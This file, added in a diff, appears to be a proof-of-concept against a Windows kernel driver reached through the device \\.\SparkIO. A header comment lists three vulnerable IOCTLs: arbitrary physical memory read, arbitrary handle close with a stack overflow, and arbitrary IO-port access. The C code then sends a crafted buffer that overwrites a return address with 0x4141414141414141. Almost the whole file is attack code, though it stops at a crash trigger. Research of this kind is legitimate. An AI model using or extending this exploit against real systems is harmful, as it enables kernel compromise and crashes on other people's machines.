@@ -1,0 +1,70 @@
+/*
+IOCTL 0x40002004 : Arbitrary Physical Memory Read using MmMapIoSpace
+IOCTL 0x40002008 : Close a handle of your choice! + Stack-based Buffer Overflow
+IOCTL 0x40002000 : Arbitrary RW to IO ports
+*/
+#include <Windows.h>
+#include <stdio.h>
+
+#define GLE( x ) { printf("%s failed with error: %d\n", x , GetLastError()); }
+#define IOCTL_TRIGGER_OVERFLOW 0x40002008
+
+typedef struct BufferOverflow {
+	HANDLE reserved0;
+	DWORD64 reserved1[6]; 
+	DWORD64 ROP_RET_1; 
+	DWORD64 reserved2[20];
+} BufferOverflow, * PBufferOverflow;
+
+DWORD64 genPattern(BYTE b) {
+	DWORD64 retVal = b;
+	retVal |= retVal << 8;
+	retVal |= retVal << 16;
+	retVal |= retVal << 32;
+	return retVal;
+}
+
+NTSTATUS triggerOverflow(HANDLE hDevice, PBufferOverflow pOverflowData) {
+	DWORD64 dummy = 0;
+	DWORD dwBytesReturned = 0;
+	NTSTATUS status = DeviceIoControl(
+		hDevice,
+		IOCTL_TRIGGER_OVERFLOW,
+		pOverflowData,
+		sizeof(BufferOverflow),
+		&dummy,
+		sizeof(dummy),
+		&dwBytesReturned,
+		NULL
+	);
+
+	return status;
+}
+
+
+int main() {
+	BufferOverflow bo = { 0 };
+	NTSTATUS status = 0;
+	const char* strDevName = R"(\\.\SparkIO)";
+
+	puts("Opening device");
+	HANDLE hFile = CreateFileA(strDevName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hFile == (HANDLE)0 || hFile == INVALID_HANDLE_VALUE) {
+		GLE("CreateFileA");
+		return -1;
+	}
+
+	puts("Opened handle to device");
+	puts("Triggering buffer overflow... Press any key to continue...");
+	getchar();
+	// set the return address to 0x4141414141414141
+	bo.ROP_RET_1 = genPattern(0x41);
+
+	status = triggerOverflow(hFile, &bo);
+	if (status) {
+		GLE("Overflow Trigger Failed");
+		printf("%lx\n", status);
+		return status;
+	}
+}
